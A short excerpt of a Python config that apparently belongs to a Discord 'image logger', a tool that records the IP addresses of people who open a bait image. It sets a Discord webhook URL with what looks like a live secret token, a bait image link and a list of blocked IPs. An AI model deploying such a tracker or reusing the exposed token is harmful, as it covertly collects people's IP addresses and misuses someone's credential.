...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444860777768157357/JzPRSmCWv_oiYepT2r3zzd0l-7U1bUnjXJHo8T0UwRm3y2WoxGRWBZLCWM7lFfgrBIkt",
    "image": "https://files.catbox.moe/sam89b.png", # You can also have a custom image by using a URL argument
...
blacklistedIPs = ("0", "0", "0", "0") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
